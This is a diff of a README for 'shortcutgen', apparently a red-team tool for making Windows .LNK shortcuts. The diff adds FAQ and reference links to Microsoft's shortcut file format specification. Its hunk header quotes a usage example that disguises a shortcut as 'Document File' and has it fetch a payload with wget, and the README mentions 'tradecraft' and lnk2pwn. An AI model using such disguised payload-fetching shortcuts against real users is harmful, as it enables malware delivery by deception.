@@ -173,6 +173,10 @@ $ shortcutgen -p desktop -n "Document File" -c "wget" -a "wget -qO payload --no-
 
 I could but I decided to implement a wrapper with `wine` which is much more suitable in a long term. Saves me a lot of trouble from reinventing my own library in case it gets abandoned. It's often best to explore more options to produce similar results.
 
+### I want to understand how the Windows shell link works. Is there a technical whitepaper that does help me to make my own library?
+
+The official Microsoft's own **MS-SHLLINK binary file format** can found [here](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943?redirectedfrom=MSDN)
+
 ### Can I use the techniques for my project or other tradecraft for my own arsenal?
 
 It is highly encouraged of you to understand how the shortcut generator is being processed then outputted. The GNU GPLv3 copyleft license grants you the right to inspect the source code, modify it to your needs, and redistribute with your own copy along with the source code.
@@ -188,6 +192,8 @@ $ sudo rm -f /usr/local/src/shortcutgen.sh /usr/local/bin/shortcutgen
 ```
 
 ## References
+
+- [\[MS-SHLLINK\]: Shell Link (.LNK) Binary File Format](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943?redirectedfrom=MSDN)
 
 - [lnk2pwn](https://github.com/it-gorillaz/lnk2pwn)
 
